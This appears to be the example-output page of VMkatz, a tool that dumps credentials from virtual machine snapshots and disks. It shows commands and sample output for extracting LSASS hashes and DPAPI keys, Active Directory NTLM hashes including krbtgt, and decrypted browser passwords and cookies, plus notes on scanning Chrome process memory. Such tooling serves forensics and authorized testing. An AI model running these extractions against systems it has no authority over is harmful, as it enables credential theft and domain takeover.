# Example Output

## LSASS extraction (default text)
```
$ vmkatz snapshot.vmsn
[*] Providers: MSV(ok) WDigest(ok) Kerberos(paged) TsPkg(empty) DPAPI(ok) SSP(empty) LiveSSP(n/a) Credman(empty) CloudAP(paged)

[+] 8 logon session(s), 3 with credentials:

  LUID: 0x3e7 (SYSTEM)
  Username: YOURPC$
  Domain: WORKGROUP
  [DPAPI]
    GUID          : 94e9f320-d4a0-4737-b34e-ab106f485c0e
    MasterKey     : d0f110675ca73f39d1370bdfd...
    SHA1 MasterKey: ea72698de207dab9e01fd9ab63f322ae82b4a4bb

  LUID: 0x240be
  Session: 2 | LogonType: Unknown
  Username: user
  Domain: YOURPC
  LogonServer: YOURPC
  SID: S-1-5-21-4247878743-2693906039-1959858616-1000
  [MSV1_0]
    NT Hash : bbf7d1528afa8b0fdd40a5b2531bbb6d
    SHA1    : 6ed12f1e60b17cfff120d753029314748b58aa05
    DPAPI   : 6ed12f1e60b17cfff120d753029314748b58aa05
```

## Hashcat mode
```
$ vmkatz --format hashcat snapshot.vmsn
[*] Providers: MSV(ok) WDigest(ok) ...
bbf7d1528afa8b0fdd40a5b2531bbb6d
```

## NTDS.dit extraction
```
$ vmkatz --ntds dc-disk.qcow2

[+] NTDS Artifacts:
  Partition offset : 0x100000
  ntds.dit size    : 20971520 bytes
  SYSTEM size      : 14155776 bytes
  Bootkey          : 9ae365ba5244457bfc2a26187a28346a
  Hashes extracted : 18

[+] AD NTLM Hashes:
  RID: 500    Administrator            current    NT:c66d72021a2d4744409969a581a1705e
  RID: 502    krbtgt                   current    NT:9c238cafb7b4447e5f701c71dbdcf636
  RID: 1000   vagrant                  current    NT:e02bc503339d51f71d913c245d35b50b
  ...
```

## Pagefile resolution
```
$ vmkatz --disk disk.vmdk snapshot.vmsn
[+] Pagefile: 320.0 MB
[*] Providers: MSV(ok) WDigest(ok) ...
[+] File-backed: 12540 DLL pages resolved from disk
[+] Pagefile: 2274 pages resolved from disk
```

Memory snapshots only capture physical RAM. Credentials that were paged to disk at snapshot time appear as `(paged out)`. The `--disk` flag reads pagefile.sys from the VM's virtual disk to resolve these.

In **directory mode**, this happens automatically: VMkatz discovers both the snapshot and the disk image, and resolves paged memory without manual flags.

## Browser secrets (`--chrome`)

Requires a build with `--features chrome`. Decrypts saved passwords, cookies
and autofill from Chromium-family browsers (Chrome, Edge, Brave, Vivaldi,
Opera). Firefox profile discovery works; Firefox NSS plaintext decrypt is
a scaffold.

### Disk-only

When the user's plaintext password is in LSA secrets (auto-logon /
service account / cached), no extra args needed:

```
$ vmkatz --chrome disk.vmdk
[Chrome] user/Default (Edge)
  artifacts: local_state=54644 login_data=57344 cookies=77824 web_data=262144
  path: Users\user\AppData\Local\Microsoft\Edge\User Data\Default

[+] Chrome findings: 1 password, 18 cookies, 0 autofill
  www.example.com  user@example.com  Pa$$w0rd1234
  ...
```

When the password isn't in LSA, supply it via `--chrome-password` (repeatable):

```
$ vmkatz --chrome --chrome-password vagrant --chrome-password 'P@ssword!' disk.vmdk
```

### Hybrid (memory + disk)

Pairing a memory snapshot with `--disk` gives the best v20 ABE yield —
LSASS-cached masterkeys cover GUIDs that disk-side derivation alone can't
unlock, and Chrome's elevation-service-only MKs land in this path.

```
$ vmkatz --chrome --disk windows.vmdk snapshot.vmsn
...
[Chrome] user/Default (Chrome)
  artifacts: local_state=225878 login_data=40960 cookies=40960 web_data=135168
[+] Chrome findings: 1 password, 83 cookies, 0 autofill
```

### In-process discovery (`--chrome-process-scan`, opt-in)

Walks every running `chrome.exe` / `msedge.exe` / `brave.exe` in the
snapshot through the page-table region enumerator and logs each
process's PID, image and resident memory size. Pair with `-v` to see
the discovery lines:

```
$ vmkatz -v --chrome --chrome-process-scan --disk windows.vmdk snapshot.vmsn
[INFO] [chrome-mem] PID 5688 msedge.exe (115 MiB mapped userland) — discovery only; structured CookieMonster walking is queued behind per-Chrome-version locator signatures
[INFO] [chrome-mem] PID 7732 msedge.exe (7 MiB mapped userland) — discovery only; ...
[INFO] [chrome-mem] PID 8372 msedge.exe (23 MiB mapped userland) — discovery only; ...
[INFO] [chrome-mem] discovered 5 chromium process(es); no in-memory cookies/passwords emitted (heuristic was structurally unreliable, signature locator pending)
```

The flag's `findings` output is intentionally empty today: an earlier
heuristic-based extractor (search for `https://` UTF-16 plus the next
two strings; search for ASCII domains plus the next four strings) was
removed because chrome process memory is filled with minified-JavaScript
string tables and chrome.dll constants that look syntactically identical
to cookie or credential data once isolated from their structural context.
The triples it produced were dominated by URL-path-fragment usernames
(`internal/`, `api/v1/`) and JS-token cookie values (`Symbol&&Symbol.`,
`||void 0===t||t`) — every filter pass either still leaked thousands of
false positives or rejected real cookies too.

The proper fix is the per-Chrome-version `CookieMonster` locator
signature ChromeKatz uses: pattern-match the destructor in chrome.dll,
resolve the vtable, scan the heap for objects with that vtable, then
walk the `std::map` red-black tree to read each `CanonicalCookie`. The
[struct layouts in `src/chrome/cookie_monster.rs`](https://github.com/nikaiw/VMkatz/blob/dev/src/chrome/cookie_monster.rs)
are ready; only the locator pattern is missing. Once it lands the same
flag will return real cookies and the plaintext passwords Edge ≤ 147
keeps mapped for the whole session ([Rønning, April
2026](https://www.threatlocker.com/blog/microsoft-edge-is-keeping-your-passwords-in-plaintext-memory-heres-what-that-actually-means)).

### JSON output

For tooling integration, pretty text becomes a single JSON document
containing every profile and finding:

```
$ vmkatz --chrome --chrome-json disk.vmdk
{
  "profiles": [
    { "user": "user", "browser": "Chrome", "profile_name": "Default", ... }
  ],
  "findings": {
    "passwords": [ { "url": "...", "username": "...", "password": "..." } ],
    "cookies":   [ { "host": "...", "name": "...", "value": "..." } ],
    "autofill":  [ ... ]
  }
}
```
